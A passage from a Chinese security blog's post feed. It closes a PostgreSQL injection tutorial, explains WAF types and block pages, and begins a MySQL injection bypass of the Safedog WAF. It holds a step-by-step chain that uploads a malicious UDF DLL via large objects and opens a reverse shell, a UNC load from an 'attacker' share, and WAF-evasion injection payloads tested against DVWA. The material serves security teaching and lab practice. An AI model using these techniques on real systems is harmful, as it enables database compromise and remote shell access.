<p><img src="https://i.loli.net/2021/10/11/WIpTe1XgxUNdhD5.png" alt="image-20211011204600384"></p>
<p>可以看到成功执行了系统命令，不过能够执行的命令有限。</p>
<h3 id="利用UDF函数获取反弹Shell"><a href="#利用UDF函数获取反弹Shell" class="headerlink" title="利用UDF函数获取反弹Shell"></a>利用UDF函数获取反弹Shell</h3><p>Postgres 支持许多种语言自定义函数，默认情况    下开启 plpgsql 和 c，其中 plpgsql 为标准的 sql 语句，而 c 则与 mysql UDF 类似，会加载一个动态链接库到进程空间。这样如果将 UDF 中的函数实现替换为特定的代码，就能在数据库权限下进行更多的操作（例如执行某些命令，或是干脆直接反弹回一个 shell等等）。</p>
<p>如果是其他类型数据库的注入点直接加载 UDF 似乎是不可能的，不过 postgres 强大的 Large Object将这一切变为了可能。</p>
<p>在进行这一特性的利用之前,首先需要了解如何编写 postgres 的 UDF 函数。这需要使用 postgres 附带的头文件。</p>
<p>首先需要生成一个编写一个恶意动态链接库文件（可以使用sqlmap生成）。</p>
<blockquote>
<p>另：建议将生成的动态链接库文件使用 UPX 进行压缩,这样可以有效地减少文件体积。</p>
</blockquote>
<p><img src="https://i.loli.net/2021/10/11/lv83s4GQDLkH6cA.png" alt="image-20211011223750392"></p>
<p>假设现在已经拥有保存于 <code>c:/windows/temp/test.dll</code>、导出函数名为 <code>GetResvShell</code> 的一个 UDF 文件。同时这个函数会接受两个参数，第一个参数为 text 类型，表示要反弹到的远程主机，第二个参数为 int 型，表示远程主机的端口，并且会返回一个 int 型的数值表示执行的结果，那么使用以下 sql 语句即可将此文件与其导出函数 <code>GetResvShell</code> 注册为函数 test：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">function</span> test(text,<span class="type">int</span>) <span class="keyword">returns</span> <span class="type">int</span> <span class="keyword">as</span> <span class="string">&#x27;c:/windows/temp/test.dll&#x27;</span>,<span class="string">&#x27;GetResvShell&#x27;</span> <span class="keyword">language</span> c;</span><br></pre></td></tr></table></figure>
<p>注：不止可以使用绝对路径，也可以使用UNC来加载动态链接库。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> test(text, <span class="type">integer</span>) <span class="keyword">returns</span> <span class="type">int</span> <span class="keyword">as</span> <span class="string">&#x27;//attacker/share/test.dll&#x27;</span>, <span class="string">&#x27;GetResvShell&#x27;</span> <span class="keyword">language</span> c;</span><br></pre></td></tr></table></figure>
<p>最后，在远程主机监听 8888 端口，同时执行：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> test(<span class="string">&#x27;192.168.123.42&#x27;</span>,<span class="number">8888</span>);</span><br></pre></td></tr></table></figure>
<p>即可获取一个与 postgres 相同权限的 shell。</p>
<p>当然，这里只是本地进行测试的过程,而真正在注入点要比这繁琐一些：</p>
<p>首先需要查看是否为 super 权限：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> usesuper::text::<span class="type">int</span> <span class="keyword">from</span> pg_user <span class="keyword">where</span> usename<span class="operator">=</span><span class="built_in">current_user</span>;</span><br></pre></td></tr></table></figure>
<p>如果确认为 super 权限，同时可以通过联合查询返回结果则执行以下语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,lo_creat(<span class="number">-1</span>);</span><br></pre></td></tr></table></figure>
<p>否则创建临时表保存返回的 oid：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tempAD4EA(id oid);<span class="keyword">insert</span> <span class="keyword">into</span> tempAD4EA <span class="keyword">values</span>(lo_creat(<span class="number">-1</span>));</span><br></pre></td></tr></table></figure>
<p>进行强制类型转换或盲注获取结果：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 强制类型转换报错</span><br><span class="line"><span class="keyword">select</span> (<span class="string">&#x27;&#x27;</span><span class="operator">||</span>(id::text))::<span class="type">int</span> <span class="keyword">from</span> tempAD4EA <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"># 盲注</span><br><span class="line">(省略服务端脚本中部分) <span class="keyword">and</span> (<span class="keyword">select</span> id <span class="keyword">from</span> tempAD4EA) <span class="operator">&gt;</span> <span class="number">0</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"># 基于延时的盲注</span><br><span class="line"><span class="keyword">select</span> pg_sleep(<span class="number">5</span>) <span class="keyword">where</span> (<span class="keyword">select</span> id <span class="keyword">from</span> tempAD4EA) <span class="operator">&gt;</span> <span class="number">0</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p>记下返回的 OID，以供后续使用。</p>
<p>删除临时表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> tempAD4EA;</span><br></pre></td></tr></table></figure>
<p>查看数据库版本，选择正确的 UDF：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> version()::<span class="type">int</span>;</span><br></pre></td></tr></table></figure>
<p>根据 OID 打开之前的大对象，并向其中写入内容(语句中的 OID 为先前返回)：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_open(OID,x<span class="string">&#x27;60000&#x27;</span>::<span class="type">int</span>);<span class="keyword">select</span> lo_write(<span class="number">0</span>,decode(<span class="string">&#x27;HEXCODE&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>其中 HEXCODE 部分为 UDF 经过十六进制编码之后所得，可以使用 winhex 进行此操作。由于一般情况下注入点都在 URL 处,建议每次从 udf 函数中截取 512 字节并转换为 hex 值。</p>
<p>继续向大对象中追加数据，直到 UDF 完全导入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_open(OID,x<span class="string">&#x27;60000&#x27;</span>::<span class="type">int</span>);<span class="keyword">select</span> lo_lseek(<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>);<span class="keyword">select</span> lo_write(<span class="number">0</span>,decode(<span class="string">&#x27;XXXXXXXXXXXX&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>将文件导出：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_export(OID,<span class="string">&#x27;1.dll&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>删除大对象：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_unlink(OID);;</span><br></pre></td></tr></table></figure>
<p>注册 UDF 函数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">or</span> replace <span class="keyword">function</span> test(text,<span class="type">int</span>) <span class="keyword">returns</span> <span class="type">int</span> <span class="keyword">as</span> <span class="string">&#x27;1.dll&#x27;</span>,<span class="string">&#x27;GetResvShell&#x27;</span> <span class="keyword">language</span> c;</span><br></pre></td></tr></table></figure>
<p>获取反弹 Shell：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> test(<span class="string">&#x27;192.168.1.10&#x27;</span>,<span class="number">8888</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/11/tEv3xQnz4f29kVg.png" alt="QQ截图20211011230000"></p>
<p>至此对 postgres UDF函数利用已经结束了，得到一个与数据库进程相同权限的 Shell 已经是能够通过注入点获取到的最高权限了(在 linux 下为 postgres 用户权限，windows 下为 Network Services)。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://blog.csdn.net/qq_36213352/article/details/117857045">PostgreSQL介绍_孙霸天-CSDN博客_postgresql</a></li>
<li><a href="https://www.php.cn/manual/view/20866.html">II. 客户端应用程序 - [ PostgreSQL 手册 ] (php.cn)</a></li>
<li>zcgonvh 编《Postgres注入方式总结》</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>WAF-Bypass之WAF介绍与分析</title>
    <url>/post/e1e1fb64.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WAF的介绍"><a href="#WAF的介绍" class="headerlink" title="WAF的介绍"></a>WAF的介绍</h2><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p>
<p><img src="https://i.loli.net/2021/10/13/TE9WZhcpn1gP5je.png" alt="image-20211013192504092"></p>
<h2 id="WAF的工作原理"><a href="#WAF的工作原理" class="headerlink" title="WAF的工作原理"></a>WAF的工作原理</h2><p>WAF的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录。</p>
<h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>预处理阶段首先在接收到数据请求流量时会先判断是否为HTTP/HTTPS请求，之后会查看此URL请求是否在白名单之内，如果该URL请求在白名单列表里，直接交给后端Web服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。</p>
<h3 id="规则检测"><a href="#规则检测" class="headerlink" title="规则检测"></a>规则检测</h3><p>每一种WAF产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。</p>
<h3 id="处理模块"><a href="#处理模块" class="headerlink" title="处理模块"></a>处理模块</h3><p>针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端Web服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。</p>
<h3 id="日志模块"><a href="#日志模块" class="headerlink" title="日志模块"></a>日志模块</h3><p>WAF在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。</p>
<h3 id="WAF的防御思想"><a href="#WAF的防御思想" class="headerlink" title="WAF的防御思想"></a>WAF的防御思想</h3><p><strong>攻击的特点</strong>：</p>
<ul>
<li>攻击二象性：已知攻击与未知攻击</li>
<li>攻击的两个维度：形式与漏洞</li>
</ul>
<p><strong>核心原理</strong>：</p>
<ul>
<li>运用‘黑’、‘白’思想</li>
<li>特征匹配、漏洞签名</li>
<li>对匹配结果进行响应(拦截、记录)</li>
</ul>
<h2 id="WAF的分类"><a href="#WAF的分类" class="headerlink" title="WAF的分类"></a>WAF的分类</h2><h3 id="云WAF"><a href="#云WAF" class="headerlink" title="云WAF"></a>云WAF</h3><p><strong>优点</strong>：</p>
<ul>
<li>快速部署、零维护、低成本：无需安装任何软件或者部署任何硬件设备，只需修改DNS即可将网站部署到云WAF的防护范围之内。对中小型企业的网络管理员和个人站长有很大吸引力。</li>
<li>用户无需更新：云WAF的防护规则都处于云端，新漏洞爆发时，由云端负责规则的更新和维护，用户无需担心因为疏忽导致受到新型的漏洞攻击。</li>
<li>可充当CDN：云WAF在提供防护功能的同时，还同时具有CDN的功能，在进行防护的同时还可以提高网站访问的速率，CDN通过跨运营商的多线智能解析调度将静态资源动态负载到全国的云节点，用户访问某个资源时会被引导至最近的云端节点从而提高访问速度。</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>存在轻易被绕过的风险：云WAF的主要实现原理是通过将用户的DNS解析到云节点实现防护，这样一来，如果黑客通过相关手段获取了服务器的真实IP地址，然后强制解析域名，就可以轻松绕过云WAF对服务器发起攻击。</li>
<li>可靠性低：云WAF处理一次请求，其中需要经过DNS解析、请求调度、流量过滤等环节，其中涉及协同关联工作，其中只要有一个环节出现问题，就会导致网站无法访问。必要时，只能手动切换为原DNS来保证业务正常运行，而域名解析需要一定时间，则会导致网站短时间无法正常访问。</li>
<li>保密性低：网站访问数据对于一些企业、机构来说为保密数据，里面可能包含用户的隐私或者商业信息，这些数据自行管控会相对安全，但是如果使用WAF，所有的数据会记录到云端，这相当于数据被别人保管，可能存在一定的泄露风险。</li>
</ul>
<p><strong>主流产品</strong>：阿里云盾、cloudflare、百度云加速、腾讯云安全、深信服云WAF、创宇盾、加速乐、安全宝</p>
<h3 id="软件WAF"><a href="#软件WAF" class="headerlink" title="软件WAF"></a>软件WAF</h3><p><strong>优点</strong>：</p>
<ul>
<li>安装简单、使用方便、成本低：采用纯软件的方式实现</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>安全性和可靠性低：软件WAF必须安装Web应用服务器上，所以，除了性能受到限制，还可能存在兼容性、安全性不足及升级成本较高等问题。</li>
</ul>
<p><strong>主流产品</strong>：网站安全狗、云锁、D盾、宝塔面板、ModSecurity、Naxsi、360网站卫士、360webscan</p>
<h3 id="硬件WAF"><a href="#硬件WAF" class="headerlink" title="硬件WAF"></a>硬件WAF</h3><p><strong>优点</strong>：</p>
<ul>
<li>可承受较高的吞吐量。</li>
<li>性能好、功能全、支持多种部署方式</li>
<li>即插即用：由于硬件防部署简易，硬件WAF只需串联到网络中，进行简单的配置后即可实现Web安全防护。</li>
<li>防护范围大：由于硬件防火墙直接串联到了交换机，所以在同一个交换机下的所有服务器，都处于防火墙的防护范围之类。</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>价格昂贵，动辄几十万。</li>
<li>存在一定误杀：由于硬件WAF是通过攻击规则库对异常流量进行识别，所以在业务系统复杂的情况下，可能存在一定误杀导致正常功能被防火墙拦截导致影响正常业务。</li>
<li>存在一定绕过机率：硬件防火墙对HTTP协议进行自行解析，可能存在与Web服务器对HTTP请求的理解不一致从而导致被绕过。</li>
</ul>
<p><strong>主流厂商</strong>：启明星辰、安恒、绿盟、天融信、飞塔</p>
<h3 id="自定义WAF"><a href="#自定义WAF" class="headerlink" title="自定义WAF"></a>自定义WAF</h3><p>我们在平时的渗透测试中，更多情况下会遇到的是网站开发人员自己写的防护规则。网站开发人员为了网站的安全，会在可能遭受攻击的地方增加一些安全防护代码，比如过滤敏感字符，对潜在的威胁的字符进行编码、转义等。</p>
<h2 id="WAF的部署模式"><a href="#WAF的部署模式" class="headerlink" title="WAF的部署模式"></a>WAF的部署模式</h2><h3 id="基于DNS解析的云WAF"><a href="#基于DNS解析的云WAF" class="headerlink" title="基于DNS解析的云WAF"></a>基于DNS解析的云WAF</h3><p>修改DNS，让域名解析到反向代理服务器。所有流量经过反向代理进行检测，检测无问题之后再转发给后端的Web服务器。</p>
<p><img src="https://i.loli.net/2021/10/13/BO6zTMUWfyswQXY.png" alt="image-20211013200415493"></p>
<h3 id="串联模式"><a href="#串联模式" class="headerlink" title="串联模式"></a>串联模式</h3><p>硬件防护设备串在网络链路中，所有的流量经过核心交换机引流到防护设备中，在防护设备中对请求进行检测，合法的请求会把流量发送给Web服务器。当发现攻击行为时，会阻断该请求，后端Web服务器无感知到任何请求。</p>
<h4 id="反向代理模式"><a href="#反向代理模式" class="headerlink" title="反向代理模式"></a>反向代理模式</h4><p>WAF作为反向代理服务器向后端服务器转发收到的HTTP请求，在转发的同时会对经过的HTTP请求做攻击检测。</p>
<p>但该模式会改变现有网络结构，用户真实IP会以HTTP Header传递给后端web服务器，需要提前配置好域名与目的服务器的转发规则，在站点和后端Web服务器较多的情况下，转发规则等配置较复杂。</p>
<p><img src="https://i.loli.net/2021/10/13/aDk4bswpCzfmvYH.png" alt="image-20211013204206923"></p>
<h4 id="透明代理模式"><a href="#透明代理模式" class="headerlink" title="透明代理模式"></a>透明代理模式</h4><p>WAF将客户端与web服务器之间TCP连接监控下来。在用户无感知的情况下代理了WEB客户端和服务器之间的会话，并基于桥模式进行转发。从WEB客户端的角度看，WEB客户端仍然是直接访问服务器。</p>
<p>从WAF工作转发原理看和透明网桥转发一样，因而称之为透明代理模式。该方式的特点是：对网络的改动最小，可以实现零配置部署。</p>
<p><img src="https://i.loli.net/2021/10/13/WE5du69PhSpbcOV.png" alt="image-20211013204502126"></p>
<h3 id="旁路模式"><a href="#旁路模式" class="headerlink" title="旁路模式"></a>旁路模式</h3><p>利用交换机的端口镜像功能，将业务流量转发一份给WAF，WAF只对业务流量进行监控和报警，不进行拦截阻断。对于WAF而言，流量只进不出。</p>
<p>该模式的特点是：在WAF出故障的情况下，不影响业务连续性。但是需要联动其他设备(如出口防火墙)来下发阻断策略。</p>
<p><img src="https://i.loli.net/2021/10/13/jUYgnTHedQFhISW.png" alt="image-20211013204644602"></p>
<h3 id="软件嵌入中间件-检测引擎模式"><a href="#软件嵌入中间件-检测引擎模式" class="headerlink" title="软件嵌入中间件 + 检测引擎模式"></a>软件嵌入中间件 + 检测引擎模式</h3><p>​    </p>
<p><img src="https://i.loli.net/2021/10/13/GZwQ5FTdUfJ1a8S.png" alt="image-20211013204950399"></p>
<h2 id="WAF绕过的实现"><a href="#WAF绕过的实现" class="headerlink" title="WAF绕过的实现"></a>WAF绕过的实现</h2><h3 id="WAF为什么会被绕过？"><a href="#WAF为什么会被绕过？" class="headerlink" title="WAF为什么会被绕过？"></a>WAF为什么会被绕过？</h3><ul>
<li>鱼（安全）与 熊掌（业务性能）不可兼得</li>
<li>WAF为了考虑通用性的问题，无法100%覆盖某些语言、中间件、数据库的特性；</li>
<li>硬件WAF自身往往存在漏洞</li>
</ul>
<h3 id="WAF绕过的角度"><a href="#WAF绕过的角度" class="headerlink" title="WAF绕过的角度"></a>WAF绕过的角度</h3><ul>
<li><strong>资源限制</strong> ———————（如通过超大数据包绕过WAF）</li>
<li><strong>架构</strong> ———————（如通过DNS解析等寻找真实IP来绕过云WAF）</li>
<li><strong>规则缺陷</strong>/<strong>特性</strong> ———————（如利用正则匹配缺陷、数据库特性、中间件特性等绕过WAF）</li>
<li><strong>协议</strong> ———————（如针对HTTP_0.9版本下TCP长链接情况下的绕过）</li>
</ul>
<p>之后的WAF Bypass也会从这几个角度分析，绕过各种WAF。</p>
<h2 id="不同WAF拦截告警页面"><a href="#不同WAF拦截告警页面" class="headerlink" title="不同WAF拦截告警页面"></a>不同WAF拦截告警页面</h2><p>不同的WAF产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款WAF产品，从而有目的性的进行WAF绕过。</p>
<h3 id="安全狗"><a href="#安全狗" class="headerlink" title="安全狗"></a>安全狗</h3><p><strong>旧版</strong>：</p>
<p><img src="https://i.loli.net/2021/10/13/nB3T4CL26jVOhK5.png" alt="image-20211013231932526"></p>
<p><strong>新版</strong>：</p>
<p><img src="https://i.loli.net/2021/10/13/B4oj93meSkDN7X6.png" alt="image-20211013231857602"></p>
<h3 id="D盾"><a href="#D盾" class="headerlink" title="D盾"></a>D盾</h3><p><img src="https://i.loli.net/2021/10/13/BTeAwgRkQXl5jmP.png" alt="image-20211013232137219"></p>
<h3 id="西数WTS-WAF"><a href="#西数WTS-WAF" class="headerlink" title="西数WTS-WAF"></a>西数WTS-WAF</h3><p><img src="https://i.loli.net/2021/10/13/TbSFjlM3GkJvnVI.png" alt="img"></p>
<h3 id="云锁"><a href="#云锁" class="headerlink" title="云锁"></a>云锁</h3><p><img src="https://i.loli.net/2021/10/13/X7uHVW8Snf1qIUc.png" alt="img"></p>
<h3 id="宝塔网站防火墙"><a href="#宝塔网站防火墙" class="headerlink" title="宝塔网站防火墙"></a>宝塔网站防火墙</h3><p><img src="https://i.loli.net/2021/10/13/a7vXxRNwoDWQzZf.png" alt="image-20211013232423393"></p>
<h3 id="安全宝"><a href="#安全宝" class="headerlink" title="安全宝"></a>安全宝</h3><p><img src="https://i.loli.net/2021/10/13/dhE1mGx2zf7eZlX.png" alt="image-20211013234028253"></p>
<h3 id="护卫神"><a href="#护卫神" class="headerlink" title="护卫神"></a>护卫神</h3><p><img src="https://i.loli.net/2021/10/13/P4ogsQFXAWcI3wh.png" alt="img"></p>
<h3 id="UPUPW"><a href="#UPUPW" class="headerlink" title="UPUPW"></a>UPUPW</h3><p><img src="https://i.loli.net/2021/10/13/AW7bz8kLPMomS1I.png" alt="img"></p>
<h3 id="阿里云盾"><a href="#阿里云盾" class="headerlink" title="阿里云盾"></a>阿里云盾</h3><p><img src="https://i.loli.net/2021/10/13/pADYIxnVw2hERme.png" alt="img"></p>
<h3 id="CloudFlare"><a href="#CloudFlare" class="headerlink" title="CloudFlare"></a>CloudFlare</h3><p><img src="https://i.loli.net/2021/10/13/SzwFKj6QlUdqsnT.png" alt="image-20211013232237378"></p>
<h3 id="创宇盾"><a href="#创宇盾" class="headerlink" title="创宇盾"></a>创宇盾</h3><p><img src="https://i.loli.net/2021/10/13/GCysZ7FEHo8P5Ya.png" alt="img"></p>
<h3 id="玄武盾"><a href="#玄武盾" class="headerlink" title="玄武盾"></a>玄武盾</h3><p><img src="https://i.loli.net/2021/10/13/4YsNCluj6cRzvbL.png" alt="image-20211013233123284"></p>
<h3 id="蓝盾"><a href="#蓝盾" class="headerlink" title="蓝盾"></a>蓝盾</h3><p><img src="https://i.loli.net/2021/10/13/2GEfa8wDTlienRP.png" alt="image-20211013234111708"></p>
<h3 id="DuEdge百度边缘网络计算"><a href="#DuEdge百度边缘网络计算" class="headerlink" title="DuEdge百度边缘网络计算"></a>DuEdge百度边缘网络计算</h3><p><img src="https://i.loli.net/2021/10/13/eAVETpOaRbzQgqY.png" alt="image-20211013233354082"></p>
<h3 id="腾讯云"><a href="#腾讯云" class="headerlink" title="腾讯云"></a>腾讯云</h3><p><img src="https://i.loli.net/2021/10/13/xiJtU4V32BmWzXY.png" alt="img"></p>
<h3 id="百度云"><a href="#百度云" class="headerlink" title="百度云"></a>百度云</h3><p><img src="https://i.loli.net/2021/10/13/5UlW3hSm9OjbIYM.png" alt="img"></p>
<h3 id="华为云"><a href="#华为云" class="headerlink" title="华为云"></a>华为云</h3><p><img src="https://i.loli.net/2021/10/13/oFm8vNZaPTt1jOb.png" alt="img"></p>
<h3 id="360webscan"><a href="#360webscan" class="headerlink" title="360webscan"></a>360webscan</h3><p><img src="https://i.loli.net/2021/10/13/PaAlbG5K86RQzq1.png" alt="img"></p>
<h3 id="360安域"><a href="#360安域" class="headerlink" title="360安域"></a>360安域</h3><p><img src="https://i.loli.net/2021/10/13/cDw6SLsRe3QBAb1.png" alt="image-20211013234002168"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>ZP《Bypass安全狗mysql注入》</li>
<li><a href="https://www.freebuf.com/articles/web/229982.html">WAF机制及绕过方法总结：注入篇 - FreeBuf网络安全行业门户</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1728133">干货 | 常见WAF拦截页面总结 - 云+社区 - 腾讯云 (tencent.com)</a></li>
<li><a href="https://mp.weixin.qq.com/s/kRrELJquobgnXXz2ItRNxw">Waf识别工具和83个Waf拦截页面 (qq.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>WAF-Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>WAF-Bypass之SQL注入绕过安全狗</title>
    <url>/post/6c2dcc62.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Bypass安全狗MySQL注入"><a href="#Bypass安全狗MySQL注入" class="headerlink" title="Bypass安全狗MySQL注入"></a>Bypass安全狗MySQL注入</h2><h3 id="MySQL特性"><a href="#MySQL特性" class="headerlink" title="MySQL特性"></a>MySQL特性</h3><p><strong>空格可以由其它字符替代</strong></p>
<blockquote>
<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,username<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
</blockquote>
<ul>
<li><p>位置①</p>
<ul>
<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
<li>可以利用注释符号替换空格：/**/、%23est%0d%0a、 —+a%0d%0a</li>
<li>可以利用数学运算以及数据类型：news_id=1.0，news_id=1E0，news_id=\N</li>
</ul>
</li>
<li><p>位置②</p>
<ul>
<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
<li>可以利用括号：union(select 1,2)</li>
</ul>
</li>
<li><p>位置③</p>
<ul>
<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
<li>可以利用其它符号：+ 、- 、 ~ 、!、@</li>
</ul>
</li>
<li><p>位置④</p>
<ul>
<li><p>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</p>
</li>
<li><p>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</p>
</li>
<li><p>大括号{}：union select {``1},{x 2}</p>
</li>
<li><p>可利用数学运算以及数据类型：</p>
<blockquote>
<p>union select usename,2.0from admin<br>union select username,8e0from admin<br>union select username,\Nfrom admin</p>
</blockquote>
</li>
</ul>
</li>
<li><p>位置⑤</p>
<ul>
<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
<li>反引号`：union select 1,table_name,3  from`information_schema`.`tables`limit 0,1%23</li>
<li>内联注释：union select 1,table_name,3  from /*!50001information_schema.tables*/ limit 0,1%23</li>
<li>大括号{}：union select 1,table_name,3  from{x information_schema.tables}limit 0,1%23</li>
<li>小括号()：union select 1,table_name,3  from(information_schema.tables)limit 0,1%23</li>
</ul>
</li>
</ul>
<h3 id="实验靶场"><a href="#实验靶场" class="headerlink" title="实验靶场"></a>实验靶场</h3><p>靶场：DVWA（low级别）</p>
<p>数据库：MySQL 5.5</p>
<p>Web脚本：PHP 5.4.19</p>
<p>WAF：网站安全狗（Apache版）v4.0.2313</p>
<p><img src="https://i.loli.net/2021/10/14/O1zMRZh2BSXbfr8.png" alt="image-20211014211210255"></p>
<p>让我们查看一下DVWA-LOW级别SQL注入的源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到这里是采用$_REQUEST的方式进行表单数据的传递。这就说明既可以使用GET方式传参，也可以使用POST方式进行传参。</p>
<h3 id="超大数据包绕过"><a href="#超大数据包绕过" class="headerlink" title="超大数据包绕过"></a>超大数据包绕过</h3><h4 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>资源限制：WAF长度资源限制</strong></p>
